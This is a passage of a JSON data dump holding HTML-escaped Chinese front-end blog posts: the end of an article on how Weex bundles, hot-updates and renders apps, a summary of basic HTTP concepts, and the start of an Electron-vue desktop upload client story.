src=\"https://user-gold-cdn.xitu.io/2017/9/18/069e899153b6bb1c83dcc4b26c05ba0c\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cbr\u003e虽然说，weex可以抹平三端开发的差异，但是知其然也应知其所以然使用起来才能游刃有余。\u003cp\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e打包\u003c/h2\u003e\n\u003cp\u003e熟悉RN的人都知道，RN的发布实际上就是发布一个JSBundle，Weex也是这样，但不同的是，Weex将工程进行分包，发布多个JSBundle。因为weex是单页独立开发的，每个页面都将通过weex打包器将vue/we页面打包成一个单独的JSBundle，这样的好处在于减少单个bundle包的大小，使其变的足够小巧轻量，提高增量更新的效率。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 仅打包\u003c/span\u003e\n$ npm run build\n\u003cspan class=\"hljs-comment\"\u003e# 打包+构建\u003c/span\u003e\n$ weex build ios\n\u003cspan class=\"hljs-comment\"\u003e# 打包+构建+安装执行\u003c/span\u003e\n$ weex run ios\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以上三种均会触发weex对工程进行打包。\u003cbr\u003e在我们执行了以上打包命令后，所有的工程文件将被单独打成一个独立的JSBundle，如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/0c01d3a1d36b9f49947fe21b3305c026\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cbr\u003e打包后的JSBundle有两种格式\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e# 由.vue文件打包出来的包格式（简写），使用vue2.0语法编写\n// { \"framework\": \"Vue\"} \n/******/ (function(modules) { \n          .......\n/******/ })\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e# 由.we文件打包出来的包格式（简写），使用weex语法编写\n// { \"framework\": \"Weex\" }\n/******/ (function(modules) { \n          .......\n/******/ })\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e不同的头部是要告诉使用什么语法解析此JSBundle。\u003c/p\u003e\n\u003cp\u003e至此，我们准备“热更新的包”就已经准备完毕了，接下就是发包执行了。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e发包\u003c/h2\u003e\n\u003cp\u003e打包后的 JSBundle 一般发布到发包服务器上，客户端从服务器更新包后即可在下次启动执行新的版本，而无需重新下载 app，因为运行依赖的 WeexSDK 已经存在于客户端了，除非新包依赖于新的 SDK，这也是热更新的基本原理。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e【WeexSDK】包括\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e【JS Framework】JSBundle 的执行环境\u003c/li\u003e\n\u003cli\u003e【JS-Native Bridge】中间件或者叫通讯桥梁，也叫【Weex Runtime】\u003c/li\u003e\n\u003cli\u003e【Native Render Engine】解析 js 端发出的指令做原生控件布局渲染\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"-\"\u003e执行\u003c/h2\u003e\n\u003cp\u003eWeex 的 iOS 和 Android 客户端的【JSFramework】中都会运行一个 JavaScript 引擎，来执行 JS bundle，同时向各端的渲染层发送规范化的指令，调度客户端的渲染和其它各种能力。iOS 下选择了 JavaScriptCore 内核，而在 Android 下选择了 UC 提供的 v8 内核（RN两端都是JavaScriptCore 内核）。\u003c/p\u003e\n\u003cp\u003eJSBundle被push到客户端后就会在JSFramework中执行，最终输出三端可读性的VNode节点，数据结构简化如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e{\n  tag: \u003cspan class=\"hljs-string\"\u003e'div'\u003c/span\u003e,\n  data: {\n    staticStyle: { justifyContent: \u003cspan class=\"hljs-string\"\u003e'center'\u003c/span\u003e }\n  },\n  children: [{\n    tag: \u003cspan class=\"hljs-string\"\u003e'text'\u003c/span\u003e,\n    data: {\n      staticClass: \u003cspan class=\"hljs-string\"\u003e'txt'\u003c/span\u003e\n    },\n    context: {\n      \u003cspan class=\"hljs-variable\"\u003e$options\u003c/span\u003e: {\n        style: {\n          freestyle: {\n            textAlign: \u003cspan class=\"hljs-string\"\u003e'center'\u003c/span\u003e,\n            fontSize: 200\n          }\n        }\n      }\n    },\n    children: [{\n      tag: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n      text: \u003cspan class=\"hljs-string\"\u003e'文字'\u003c/span\u003e\n    }]\n  }]\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e有了统一的VNode节点，各端即可根据自己的方法解析渲染原生UI了，之前的所有操作都是一致的，包括文件格式、打包编译过程、模板指令、组件的生命周期、数据绑定等。\u003c/p\u003e\n\u003cp\u003e然而由于目标执行环境不同（浏览器和 Weex 容器），在渲染真实原生UI的时候调用的接口也不同。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/27d1a733b4ba94bf75a4c3fecb30d05e\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e此过程发生在【Weex SDK】的【Weex Runtime】中。\u003c/p\u003e\n\u003cp\u003e最总【Weex Runtime】发起渲染指令\u003ccode\u003ecallNative({...})\u003c/code\u003e有RenderEngine完成渲染\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/d1a9b745257998d674a845db14648f4b\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/4350ef0b1f556d267fd031b126f7871d\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e总结一下\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eweex文件分包打包成单个JSBundle文件\u003c/li\u003e\n\u003cli\u003e发布到发包服务器上，通过热更新push到用户的客户端，交由【Weex SDK】执行解析\u003c/li\u003e\n\u003cli\u003eSDK中的【JS Framework】执行Bundle脚本生成Virtual DOM\u003c/li\u003e\n\u003cli\u003eVirtual DOM经由各端执行环境【Weex Runtime】解析翻译成执行指令\u003c/li\u003e\n\u003cli\u003e【Native RenderEngine】接收到指令后执行渲染操作，作出渲染出完整的界面\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e官方配图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/eb8067d835141a521e2c31b94760bdab\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e扩充配图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/957343d13dab0fef220cfbabccf2c54b\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch1 id=\"weex-\"\u003eWeex 的工作模式\u003c/h1\u003e\n\u003ch2 id=\"1-\"\u003e1. 全页模式\u003c/h2\u003e\n\u003cp\u003e目前支持单页使用或整个App使用Weex开发（还不完善，需要开发Router和生命周期管理）。\u003c/p\u003e\n\u003cp\u003e本文先行的严选demo便是使用第二种全屏模式，使用Weex开发整个App，期间触碰到Weex的在此模式下诸多不足，如StatusBar控制、Tab切换、开场动画自定义、3DTouch、 Widget等等原生的特色功能没有现成的API，需要我们自己扩展，甚至扩展不了。因此并不能完全“灭掉”原生。\u003c/p\u003e\n\u003cp\u003e所以，目前在阿里内部使用较多的是此模式中的单页模式，这也是为什么官方文档在介绍原理后就直接奔入\u003cstrong\u003e集成到原生应用\u003c/strong\u003e的主题上去了。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/50606c32a34516a30ab7bb72acb9a23c\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 id=\"2-native-component-\"\u003e2. Native Component模式\u003c/h2\u003e\n\u003cp\u003e把Weex当作一个iOS/Android组件来使用，类比ImageView。这类需求遍布手淘主链路，如首页、主搜结果、交易组件化等，这类Native页面主体已经很稳定，但是局部动态化需求旺盛导致频繁发版，解决这类问题也是Weex的重点。\u003c/p\u003e\n\u003ch2 id=\"3-h5-component-\"\u003e3. H5 Component模式\u003c/h2\u003e\n\u003cp\u003e在H5种使用Weex，类比WVC。一些较复杂或特殊的H5页面短期内无法完全转为Weex全页模式（或RN），比如互动类页面、一些复杂频道页等。这个痛点的解决办法是：在现有的H5页面上做微调，引入Native解决长列表内存暴增、滚动不流畅、动画/手势体验差等问题。\u003c/p\u003e\n\u003cp\u003e另外，WVC将会融入到Weex中，成为Weex的H5 Components模式。\u003c/p\u003e\n\u003ch1 id=\"-app-demo-\"\u003e严选 App Demo 实现过程中的感想\u003c/h1\u003e\n\u003ch2 id=\"vue-router-tab\"\u003eVue-Router \u0026amp; Tab\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/01a0ebececda510f517ba72bb0d0e925\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e由于Weex没有封装Tab的组件，因此笔者使用了很多方法来实现Tab切换的功能。\u003c/p\u003e\n\u003cp\u003e1、vue-router：router思想方便管理，但是每次切换都是新的实例，没有tab模式\u003cbr\u003e2、opacity、visablity：此处需要注意，Weex的渲染机制和web是有区别的，对夫层设置opacity或者visiablity隐藏是无法同时隐藏定位为\u003ccode\u003eposition:fixed;\u003c/code\u003e 的子元素。\u003cbr\u003e3、position、transform：改变tab层的位置，此方法在定位为\u003ccode\u003eposition:fixed;\u003c/code\u003e 的子元素上依然无效。\u003c/p\u003e\n\u003ch2 id=\"image-iconfont\"\u003eimage \u0026amp; iconfont\u003c/h2\u003e\n\u003cp\u003eWeex中所有的静态资源基本都是网络资源，包括图片、字体图片等，所以使用iconfont图标是再合适不过的了。\u003c/p\u003e\n\u003cp\u003e此demo中所有的icon均使用的iconfont。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/863cd21c13901ee2fa50e14e8b455df3\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e此处强烈推荐一个站点\u003ca href=\"http://www.iconfont.cn\"\u003ewww.iconfont.cn\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/90d061dbd1f4f0bd2f445d22466d084f\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在此平台你可以找到几乎所有你需要的icon，你也可以上传自己的icon到自己创建的项目中。同时该系统还提供生成ttf、woff资源，并且做了cdn加速和gzip压缩，是不是跟weex很配呢？\u003c/p\u003e\n\u003cp\u003e不过也有风险，就是，如果哪天阿里不在维护并回收该平台的资源了，你的app可能就会变成这样，全是方框，或者padding掉你H5的页面\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/9cbb76d24dc8670e4dc3082db4bd27c9\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e当然，这种及情况出现的几率很小，如果你是一个大公司，你手上有更好的资源急速方案，那就自己保存吧。\u003c/p\u003e\n\u003ch2 id=\"webview\"\u003ewebview\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/23b6546eeab9e2611c4d2280ba045993\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eUIWebView是我们开发App常用的一个控件，不过Weex帮我们封装好的API明显时不够用的，目前只有\u003ccode\u003epagestart\u003c/code\u003e、\u003ccode\u003epagefinish\u003c/code\u003e、\u003ccode\u003eerror\u003c/code\u003e，并没有封装像RN那样的\u003ccode\u003eonShouldStartLoadWithRequest\u003c/code\u003e拦截地址请求的API，在我看来，这有些不合理，并不清楚轮子的制造者是什么意图。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e性能\u003c/h2\u003e\n\u003cp\u003e性能是一个大课题，在此就不做展开了，只稍微提及一些我们开发需要注意的几点\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e性能影响点：UI更新\u0026gt;UI事件响应\u0026gt;后台运算\u003c/li\u003e\n\u003cli\u003e合理优化过场\u0026amp;动画，过场和 console 容易引起 app crash 需要注意\u003c/li\u003e\n\u003cli\u003e降低 js \u0026lt;-\u0026gt; native 的通信频率\u003c/li\u003e\n\u003cli\u003e优化list结构，降低重排重绘压力\u003c/li\u003e\n\u003cli\u003e把优先级低且耗时较长的工作推后处理\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"weex-\"\u003eWeex的现状\u003c/h2\u003e\n\u003ch3 id=\"weex-\"\u003eWeex解决了的\u003c/h3\u003e\n\u003ch4 id=\"-\"\u003e我的发布我做主（热更新）\u003c/h4\u003e\n\u003cp\u003e脚本语言天生自带“热更新”，Weex针对RN的热更新策略做了优化，将WeexSDK事先绑到了客户端上，并且对JSBundle进行分包增量更新，大大提高了热更新的效率。\u003c/p\u003e\n\u003cp\u003e但优点也是缺点，如果新包依赖于心的SDK，此情况下，我们需要发布还有新SDK的app到应用市场，用户也须从市场更新此app。不够随着WeexSDK版本的稳定后，相信此策略的优势就会凸显出来。\u003c/p\u003e\n\u003ch4 id=\"-\"\u003e性能问题\u003c/h4\u003e\n\u003cp\u003eWeex是一种轻量级、可扩展、高性能框架。集成也很方便，可以直接在HTML5页面嵌入，也可嵌在原生UI中。由于和ReactNative一样，都会调用Native端的原生控件，所以在性能上比Hybrid高出一个层次。\u003c/p\u003e\n\u003ch4 id=\"-\"\u003e统一三端\u003c/h4\u003e\n\u003cp\u003e虽说这是一个大胆的实践，但对于大前端社区的统一有着推动作用，显然阿里在这一方面已经迈出了第一步。基本解决了三端同等需求导致资源浪费的痛点。\u003c/p\u003e\n\u003cp\u003e但后期可能会出现这种现象，开发一个三端的App会从原来的个人变成四个人，多出来的那一个人负责开发Weex单页。\u003c/p\u003e\n\u003cp\u003e意思就是，三端统一的不够彻底，但就目前的环境下，这一句是最优方案了，却是提高了开发效率。大前端将来将如何一统三国我们且行且观望吧。\u003c/p\u003e\n\u003ch4 id=\"-\"\u003e做游戏\u003c/h4\u003e\n\u003cp\u003e对于一些交互视觉统一且没有很大的性能需求的游戏，Weex还是可以胜任的。\u003c/p\u003e\n\u003cp\u003e近期笔者将尝试发布一款纯Weex构建的益智小游戏，敬请期待。\u003c/p\u003e\n\u003cp\u003e朋友们可以用这个demo体验下\u003ca href=\"https://yq.aliyun.com/articles/42627?spm=5176.100239.blogcont57995.19.OsYCTt\"\u003eWeex 版扫雷游戏开发\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"weex-\"\u003eWeex “暂时”放弃的\u003c/h3\u003e\n\u003cp\u003e虽然说大一统事件百利的事，但并非无一害。\u003c/p\u003e\n\u003ch4 id=\"-\"\u003e差异化\u003c/h4\u003e\n\u003cp\u003e对于一些有差异化完美体验追求的项目就只能收敛或者放弃了。\u003c/p\u003e\n\u003ch4 id=\"-bug-\"\u003e独立的bug修复\u003c/h4\u003e\n\u003cp\u003e对于三端同时上线，一端存在bug的情况，Weex并不能保证做到牵一发而不动全身。\u003c/p\u003e\n\u003ch4 id=\"-\"\u003e个性化功能\u003c/h4\u003e\n\u003cp\u003e比如安卓的波纹按钮、3DTouch、 Widget、iWatch版本等，目前这些功能还是没有的，不知道以后Weex是否将其加入到官方文档中。\u003c/p\u003e\n\u003ch1 id=\"-\"\u003e声明\u003c/h1\u003e\n\u003cp\u003e以上均为个人见解，不代表官方。如有不当之处还望指正。\u003c/p\u003e\n\u003ch1 id=\"-\"\u003e参考\u003c/h1\u003e\n\u003cp\u003e[ 1 ] \u003ca href=\"weex.apache.org\"\u003eWeex官方文档\u003c/a\u003e - \u003ca href=\"http://weex.apache.org/cn/references/\"\u003ehttp://weex.apache.org/cn/references/\u003c/a\u003e\u003cbr\u003e[ 2 ] \u003ca href=\"https://yq.aliyun.com/users/1429056118386139\"\u003e场景研读\u003c/a\u003e - \u003ca href=\"https://yq.aliyun.com/articles/69005\"\u003eNative 性能稳定性极致优化 - https://yq.aliyun.com/articles/69005\u003c/a\u003e\u003cbr\u003e[ 3 ] \u003ca href=\"https://yq.aliyun.com/users/1860372613355779\"\u003e门柳\u003c/a\u003e - \u003ca href=\"https://yq.aliyun.com/articles/59935?spm=5176.8067842.tagmain.66.1QA1fL\"\u003e详解 Weex JS Framework 的编译过程 - https://yq.aliyun.com/articles/59935?spm=5176.8067842.tagmain.66.1QA1fL\u003c/a\u003e\u003cbr\u003e[ 4 ] \u003ca href=\"https://segmentfault.com/u/alibaichuan\"\u003e阿里百川\u003c/a\u003e - \u003ca href=\"https://segmentfault.com/a/1190000005031818\"\u003e深度揭秘阿里移动端高性能动态化方案Weex - https://segmentfault.com/a/1190000005031818\u003c/a\u003e\u003cbr\u003e[ 5 ] \u003ca href=\"http://www.jianshu.com/u/12201cdd5d7a\"\u003e一缕殇流化隐半边冰霜\u003c/a\u003e - \u003ca href=\"http://www.jianshu.com/p/41cde2c62b81\"\u003eWeex 是如何在 iOS 客户端上跑起来的 - http://www.jianshu.com/p/41cde2c62b81\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514893589.1644","__v":0}
{"_id":{"$oid":"5a4b774a85b30d097483e988"},"id":"59f5dcacf265da432840200d","author":{"$oid":"5a4b774a85b30d097483e981"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"《图解HTTP》—简单的HTTP协议","meta":{"likeCount":0},"tag":["前端","HTTP"],"comment":[],"shortContent":"​ 一般请求都是有客户端发出的，而服务器回复的是响应。服务器相对来说是比较被动的。 客户端，请求方法 ：GET 、地址： / 、协议版本 ：HTTP1.1 、请求首部：Host:xxx等。服务器返回的信息：HTTP协议版本号，状态码以及结果短语、响应首部（响应时间之后的）和资源…","content":"\u003ch1 id=\"-http-\"\u003e简单的HTTP协议\u003c/h1\u003e\n\u003ch2 id=\"-\"\u003e客户端和服务端的通信\u003c/h2\u003e\n\u003cp\u003e​    一般请求都是有客户端发出的，而服务器回复的是响应。服务器相对来说是比较被动的。\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/29/ddd3bf58df4a67acd5c10dc299fc8957\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e客户端，请求方法 ：GET 、地址： /  、协议版本 ：HTTP1.1 、请求首部：Host:xxx等。服务器返回的信息：HTTP协议版本号，状态码以及结果短语、响应首部（响应时间之后的）和资源主体（html开始）。\u003c/p\u003e\n\u003ch2 id=\"http-\"\u003eHTTP协议是无状态的\u003c/h2\u003e\n\u003cp\u003e​    一开始在公司做前后分离，引入了token机制，为什么要这么做？本质上还是因为HTTP协议是无状态的。所谓无状态，就是通信的双方没有记住通信历史，协议本身是不保留一切请求和响应的信息。这也是确保HTTP协议有能够处理大量事务且具有可伸缩性的原因。\u003c/p\u003e\n\u003ch2 id=\"http-\"\u003eHTTP 方法\u003c/h2\u003e\n\u003cp\u003e​    GET ：获取资源。\u003c/p\u003e\n\u003cp\u003e​    POST ：传输实体主体，主要目的是传输。\u003c/p\u003e\n\u003cp\u003e​    PUT ： 传输文件，保存到指定的位置。不带验证机制。\u003c/p\u003e\n\u003cp\u003e​    HEAD ： 获得报文首部，不常用。\u003c/p\u003e\n\u003cp\u003e​    DELETE ：删除文件。 同样不带验证机制。\u003c/p\u003e\n\u003cp\u003e​    OPTIONS ：查询支持的方法。不常用\u003c/p\u003e\n\u003cp\u003e​    TRACE ：追踪路径。挺有意思的一个东西。可以计算代理服务器有多少个，但是容易引发xst攻击(好想学web安全）。不常用\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/29/9b5a2cb77ac61c1de4180c5b46a5b4bf\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e​    CONNECT ：要求使用隧道协议连接代理，不常用。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e持久链接节省通信量\u003c/h2\u003e\n\u003cp\u003e​    一图胜千言啊。 \u003c/p\u003e\n\u003cp\u003e​    1.1里提出来HTTP keep-alive。持久链接，只要没有一端提出明确的断开链接，则保持TCP链接。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/29/20b5026596ad5b05ab03dec8f3f76f85\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e​    管线化。并行发送响应，无需等待上一个请求结束。\u003c/p\u003e\n\u003ch2 id=\"-cookie-\"\u003e使用Cookie 管理状态\u003c/h2\u003e\n\u003cp\u003e​    之前说过的，因为HTTP协议是无状态的，无法判断登陆验证，所以需要在请求中添加参数来管理登录状态。\u003c/p\u003e\n\u003cp\u003e​    Cookie，服务器生成Cookie，response 过去，那么接受的客户端第二次发请求就可以设置了一个参数，保存当前登陆的信息。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/29/85e4a8645a1c49b56109ed1bf2daaf83\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e    \u003cp\u003e\u003c/p\u003e\n\u003cp\u003e​    如若有错误之处，看官多多指正，随手点个赞呗，亲。另外我的微信公众号也会慢慢发布前端的东西，希望学习前端的小伙伴可以关注一波moomoocode\u003c/p\u003e\n","buildTime":"1514078397.163","__v":0}
{"_id":{"$oid":"5a4b774a85b30d097483e989"},"id":"5966ea7d5188250d920888c9","author":{"$oid":"5a4b774a85b30d097483e985"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/7/13/d24e4b3e8827980b277437a08a268d85","https://user-gold-cdn.xitu.io/2017/7/13/f7a16889177bdcd7d7aad11c19df2b59","https://user-gold-cdn.xitu.io/2017/7/13/bab119d14baf145535062f4f06604435","https://user-gold-cdn.xitu.io/2017/7/13/61a6798fa1bd3c99c08bd27dbd499f30","https://user-gold-cdn.xitu.io/2017/7/13/c8440cc03b25df557ab64c50f560af57","https://user-gold-cdn.xitu.io/2017/7/13/4a59ffd6aa4ad7c9b66feae72bbd3240","https://user-gold-cdn.xitu.io/2017/7/13/3add43b4469531087c4c587fa79f45a0"],"screenShot":null}],"title":"动手实操 | 作为一名美女设计师，她用 6 小时写了个上传七牛云的桌面客户端","meta":{"likeCount":0},"tag":["前端"],"comment":[],"shortContent":" 在这个项目上，也就是前端的工作居多。 某日，一友人因把文件上传到 Dropbox 而引发众怒。同时，百度网盘也越来越不好用了。我随意吐槽之。 于是乎，就有了这个项目。 某个周六深夜，写小程序已闷死，突然想起答应友人的事情了。 经过初步调查，选用 Electron-vue 作为基…","content":"\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/7/13/d24e4b3e8827980b277437a08a268d85\" alt=\"\"/\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e在这个项目上，也就是前端的工作居多。\u003cbr\u003e某日，一友人因把文件上传到 Dropbox 而引发众怒。同时，百度网盘也越来越不好用了。我随意吐槽之。\u003cbr\u003e于是乎，就有了这个项目。\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/7/13/f7a16889177bdcd7d7aad11c19df2b59\" alt=\"\"/\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e某个周六深夜，写小程序已闷死，突然想起答应友人的事情了。\u003c/p\u003e\n\u003cp\u003e经过初步调查，选用 Electron-vue 作为基础框架开发。在我这个刚学 nodejs，更不懂 electron，也就只是有一定的前后端经验的人，或许这是一个挑战。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e设计定稿\u003c/h3\u003e\n\u003cp\u003e作为一个设计师，怎么也要样子好看，所以就以设计稿起步为先。\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/7/13/bab119d14baf145535062f4f06604435\" alt=\"\"/\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cbr\u003e我把主界面画了出来，确定好 UI 风格了。\u003c/p\u003e\n\u003ch3 id=\"vue\"\u003eVUE\u003c/h3\u003e\n\u003cp\u003e代码是开始在周日凌晨 1 点多。我选用了 Electron-vue 作为解决方案。\u003c/p\u003e\n\u003cp\u003e不过，由于 VUE 不熟悉，也碰到了一些坑。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e例如：\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e不知道如何引用文件（感觉以前的前端技能被残废了一样）\u003c/li\u003e\n\u003cli\u003e写完 CSS 才发现，A 页面的 CSS 会干扰 B 页面的 CSS（我还以为和小程序、React 那样）\u003c/li\u003e\n\u003cli\u003eVUE 的路由我理解了好长时间才明白。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e我以前一直写 jQuery，异步和 DOM 管理没什么问题。可是遇到 VUE，我真的觉得脑子的思維要转变了哦。特別是路由，这个明明不就是后端的事情吗？怎么前端模板也有路由概念，我折腾了有 1 小時，才发现原来所谓路由不是跳转 GET/POST 的意思，而是切换显示的页面。怪不得 Google 的时候一直出现的 SPA 这个词，其实我也没理解。直到我刚才专门 Google 才知道了。大哭（其实我以为 SPA 真的是 SPA 嘛~）。\u003c/p\u003e\n\u003ch3 id=\"electron\"\u003eElectron\u003c/h3\u003e\n\u003cp\u003e这货坑也不少。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e例如：\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e复制粘贴在 Build 后完全用不了。\u003c/li\u003e\n\u003cli\u003e一开始抓头在思考怎么做 GET 和 POST……\u003c/li\u003e\n\u003cli\u003e背景模糊玻璃效果，还没能实现，不过在 demo 的确能做到。\u003c/li\u003e\n\u003cli\u003e打包后，竟然找不到 modules……\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"-\"\u003e七牛\u003c/h3\u003e\n\u003cp\u003e官方的 Node.JS SDK 在 npm run dev 能用，但是打包 App 后有一定问题，这个还是要好好调查。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e开发\u003c/h3\u003e\n\u003cp\u003e总而言之，在我 App 编写 6 个小时候之后，终于基本可以面世了。以 Electron 的方案来开发 App 的确比传统要舒服和快，而且动画效果写起来不吃力（毕竟强大的 CSS3 动画真厉害），所以我在 App 添加了比较多的动画效果。\u003c/p\u003e\n\u003cp\u003eElectron 打包的确很大，也无解。经过 ZIP 压缩后有 40 多MB，还算能接受。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e界面效果\u003c/h3\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/7/13/61a6798fa1bd3c99c08bd27dbd499f30\" alt=\"\"/\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/7/13/c8440cc03b25df557ab64c50f560af57\" alt=\"\"/\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/7/13/4a59ffd6aa4ad7c9b66feae72bbd3240\" alt=\"\"/\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e推荐阅读：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/watch?v=Pc-vmGwy8gQ\u0026amp;feature=youtu.be\" target=\"_blank\"\u003e动画效果\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca 